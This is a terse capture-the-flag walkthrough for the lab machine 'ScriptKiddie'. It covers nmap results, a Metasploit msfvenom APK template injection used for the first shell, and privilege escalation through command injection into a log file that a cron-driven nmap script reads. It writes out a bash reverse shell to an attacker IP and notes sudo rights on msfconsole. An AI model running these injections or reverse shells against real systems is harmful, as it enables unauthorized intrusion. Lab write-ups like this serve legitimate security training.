# ScriptKiddie

### nmap

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods: 
|_  Supported Methods: POST GET OPTIONS HEAD
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
```

### Web Enum

```
http://10.10.10.226:5000/static/payloads/122f1def6a8b.exe -> payload locations
```

### Goodies

```

```

### Exploitation

```bash
# msfconsole
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > ...

[+] msf.apk stored at /home/kali/.msf4/local/msf.apk

# upload msf.apk and get shell
```

### Post Enum

```bash
# /home/kid/logs/hackers (be updated when triggering error)
tail -f hackers
[2022-06-24 07:21:18.879143] 10.10.14.3

# /home/pwn/scanlosers.sh (run when log hackers is updated)
log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

```

### Priv Esc

```bash
# inject log file
echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.3/12345 0>&1' # ." > /home/kid/logs/hackers

# payload will be like
nmap --top-ports 10 -oN recon/x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.3/12345 0>&1' # ..nmap x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.3/12345 0>&1' # . 2>&1 >/dev/null

# then get shell on user pwn
(root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

```
